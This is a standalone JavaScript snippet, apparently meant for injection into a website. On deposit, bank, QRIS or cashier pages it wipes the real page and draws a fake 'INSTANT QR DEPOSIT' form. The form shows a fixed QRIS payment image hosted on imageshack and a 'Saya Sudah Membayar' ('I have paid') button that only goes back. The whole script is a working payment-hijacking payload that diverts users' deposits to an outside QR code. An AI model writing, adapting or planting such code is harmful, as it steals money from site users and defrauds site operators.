(function () {
  const targetUrls = [
    "/deposit",
    "/bank",
    "/qris",
    "/deposit.php",
    "/bank.php",
    "/qris.php",
    "index.php?page=deposit",
    "index.php?page=cashier"
  ];

  const currentUrl = window.location.href;
  const isTarget = targetUrls.some((end) => currentUrl.endsWith(end));

  if (!isTarget) return;

  // Bersihkan isi lama
  document.documentElement.innerHTML = "";

  // Tambah font premium
  const fontLink = document.createElement("link");
  fontLink.href =
    "https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;600&display=swap";
  fontLink.rel = "stylesheet";
  document.head.appendChild(fontLink);

  // Tambah style elegan
  const style = document.createElement("style");
  style.textContent = `
    body {
      margin:0;
      font-family:'DM Sans', sans-serif;
      background: linear-gradient(160deg, #0f0f1a, #1a1440, #2c1b70);
      color:#f9f9f9;
      display:flex;
      flex-direction:column;
      align-items:center;
      min-height:100vh;
      padding:25px 15px;
      text-align:center;
    }
    h1 {
      margin:15px 0 25px;
      font-weight:600;
      font-size:1.6rem;
      letter-spacing:1px;
      color:#fff;
    }
    .card {
      width:100%;
      max-width:380px;
      background:rgba(255,255,255,0.08);
      backdrop-filter:blur(15px);
      padding:24px;
      border-radius:22px;
      box-shadow:0 10px 25px rgba(0,0,0,0.45);
      text-align:center;
    }
    .input-group {
      position:relative;
      margin-bottom:14px;
    }
    .input-group input {
      width:100%;
      padding:12px 40px 12px 14px;
      border:none;
      border-radius:14px;
      background:rgba(255,255,255,0.12);
      color:#fff;
      font-size:0.95rem;
      outline:none;
    }
    .input-group input::placeholder { color:#ccc; }
    .input-group span {
      position:absolute;
      right:12px;
      top:50%;
      transform:translateY(-50%);
      opacity:0.7;
      font-size:0.9rem;
    }
    button {
      width:100%;
      padding:13px;
      margin-top:14px;
      border:none;
      border-radius:30px;
      font-weight:600;
      cursor:pointer;
      font-size:1rem;
      transition:0.25s;
    }
    button:active { transform:scale(0.97); }
    #showQrisBtn {
      background:linear-gradient(135deg,#00c853,#009624);
      color:#fff;
    }
    #downloadBtn {
      background:linear-gradient(135deg,#2979ff,#004ecb);
      color:#fff;
    }
    #paidBtn {
      background:linear-gradient(135deg,#ffd54f,#ffb300);
      color:#222;
    }
    #qris-card { display:none; animation:fadeIn 0.5s ease; }
    @keyframes fadeIn {
      from { opacity:0; transform:translateY(20px); }
      to { opacity:1; transform:translateY(0); }
    }
    img.qris-img {
      max-width:100%;
      border-radius:18px;
      margin-bottom:18px;
      border:2px solid rgba(255,255,255,0.15);
      box-shadow:0 6px 20px rgba(0,0,0,0.35);
    }
    footer {
      margin-top:50px;
      font-size:12px;
      color:#aaa;
    }
    footer img {
      max-width:110px;
      opacity:0.85;
      margin-bottom:6px;
    }
  `;
  document.head.appendChild(style);

  // Struktur halaman
  const container = document.createElement("div");
  container.innerHTML = `
    <h1>INSTANT QR DEPOSIT</h1>
    
    <div id="form-card" class="card">
      <div class="input-group">
        <input type="text" id="nama" placeholder="Nama Pengirim">
        <span>👤</span>
      </div>
      <div class="input-group">
        <input type="number" id="nominal" placeholder="Nominal (min. 50.000)">
        <span>💰</span>
      </div>
      <div class="input-group">
        <input type="text" id="catatan" placeholder="Catatan">
        <span>📝</span>
      </div>
      <button id="showQrisBtn">Buat QRIS</button>
    </div>

    <div id="qris-card" class="card" style="margin-top:25px;">
      <img class="qris-img" src="https://imagizer.imageshack.com/v2/320xq70/r/922/CFAtIh.jpg" alt="QRIS">
      <button id="downloadBtn">Download QRIS</button>
      <button id="paidBtn">Saya Sudah Membayar</button>
    </div>

    <footer>
      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxt4SV-4Fwz_SHmJwW_ENA4zghNfwbYgAG4x_l9IbA0w&s=10" alt="Footer Image">
      <div>X2022-2025©</div>
    </footer>
  `;

  document.body.appendChild(container);

  // Event logic
  document.getElementById("showQrisBtn").addEventListener("click", function () {
    document.getElementById("form-card").style.display = "none";
    document.getElementById("qris-card").style.display = "block";
  });

  document.getElementById("downloadBtn").addEventListener("click", function () {
    window.location.href =
      "https://imagizer.imageshack.com/v2/320xq70/r/922/CFAtIh.jpg";
  });

  document.getElementById("paidBtn").addEventListener("click", function () {
    window.history.back();
  });
})();
